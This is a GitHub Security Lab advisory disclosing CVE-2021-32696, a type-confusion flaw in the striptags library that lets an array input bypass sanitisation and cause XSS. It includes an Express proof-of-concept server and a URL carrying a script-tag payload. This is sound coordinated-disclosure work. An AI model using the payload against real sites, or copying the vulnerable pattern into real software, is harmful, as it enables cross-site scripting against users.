<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">June 22, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2021-083: Type confusion in scripttag leads to XSS - CVE-2021-32696</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/ghsecuritylab">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/61799930?s=35" height="35" width="35">
        <span>GitHub Security Lab</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      
<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>

<ul>
  <li>2021-05-21: Maintainer contacted</li>
  <li>2021-06-18: Maintainer proposed a fix</li>
  <li>2021-06-18: Vulnerability was addressed</li>
</ul>

<h2 id="summary">Summary</h2>

<p>A type-confusion vulnerability leads <code class="language-plaintext highlighter-rouge">scriptags</code> to incorrectly sanitize dangerous inputs when an attacker is able to send an array (instead of a string) to the <code class="language-plaintext highlighter-rouge">striptags</code> function.</p>

<h2 id="product">Product</h2>

<p><a href="https://github.com/ericnorris/striptags"><code class="language-plaintext highlighter-rouge">ericnorris/striptags</code></a></p>

<h2 id="tested-version">Tested Version</h2>

<p>v3.1.1</p>

<h2 id="details">Details</h2>

<p><code class="language-plaintext highlighter-rouge">scriptags</code> sanitizes input by iterating on each character in the input string, but if instead of supplying the sanitizer with a string, another iterable object (such as an array of strings) is passed, then the sanitizer fails to properly sanitize the input.</p>

<h3 id="proof-of-concept">Proof of concept</h3>

<p>The following proof of concept is an <code class="language-plaintext highlighter-rouge">express</code> application that mimics the situation in which an application would be vulnerable. To test the vulnerability open he following url in a browser:</p>

<p><em>http://localhost:3000/?name[]=Foo&amp;name[]=%3Cscript%3Ealert(2)%3C/script%3E</em></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">util</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">util</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">striptags</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">striptags</span><span class="dl">'</span><span class="p">);</span>

<span class="c1">// First a local demonstration of what type-confusion can do.</span>
<span class="kd">const</span> <span class="nx">html</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">Hello &lt;strong&gt;World&lt;/strong&gt;</span><span class="dl">"</span><span class="p">;</span>
<span class="kd">const</span> <span class="nx">confused</span> <span class="o">=</span> <span class="nx">striptags</span><span class="p">([</span><span class="nx">html</span><span class="p">],</span> <span class="p">[]);</span> <span class="c1">// Putting the HTML into an array confuses the striptags function</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Type confused: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">util</span><span class="p">.</span><span class="nx">inspect</span><span class="p">(</span><span class="nx">confused</span><span class="p">));</span> <span class="c1">// Prints "Hello &lt;strong&gt;World&lt;/strong&gt;". </span>

<span class="c1">// The below demonstrates how this vulnerablity could cause reflected XSS attacks.</span>
<span class="kd">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">express</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>

<span class="c1">// Parses the query parameters as JSON. This is actually quite common in web applications.</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="nx">json</span><span class="p">());</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="nx">urlencoded</span><span class="p">({</span>
  <span class="na">extended</span><span class="p">:</span> <span class="kc">true</span>
<span class="p">}));</span>

<span class="nx">app</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">/</span><span class="dl">"</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">const</span> <span class="nx">name</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">name</span><span class="p">;</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">util</span><span class="p">.</span><span class="nx">inspect</span><span class="p">(</span><span class="nx">name</span><span class="p">));</span>
  <span class="kd">const</span> <span class="nx">stripped</span> <span class="o">=</span> <span class="nx">striptags</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span> <span class="p">[]);</span>

  <span class="c1">// This will render the following code on the browser:</span>
  <span class="c1">// `Hello Foo&lt;script&gt;alert(2)&lt;/script&gt;!`</span>
  <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">Hello </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">stripped</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">!</span><span class="dl">"</span><span class="p">);</span>
<span class="p">});</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="mi">3000</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Server started on port 3000</span><span class="dl">"</span><span class="p">);</span>
<span class="p">});</span>
</code></pre></div></div>

<h4 id="impact">Impact</h4>

<p>XSS</p>

<h2 id="cve">CVE</h2>

<ul>
  <li>CVE-2021-32696</li>
</ul>

<h2 id="resources">Resources</h2>

<ul>
  <li>https://github.com/ericnorris/striptags/security/advisories/GHSA-qxg5-2qff-p49r</li>
  <li>https://github.com/ericnorris/striptags/releases/tag/v3.2.0</li>
  <li>https://github.com/ericnorris/striptags/commit/f252a6b0819499cd65403707ebaf5cc925f2faca</li>
</ul>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GitHub team member <a href="https://github.com/erik-krogh">@erik-krogh (Erik Krogh Kristensen)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include <code class="language-plaintext highlighter-rouge">GHSL-2021-083</code> in any communication regarding this issue.</p>


    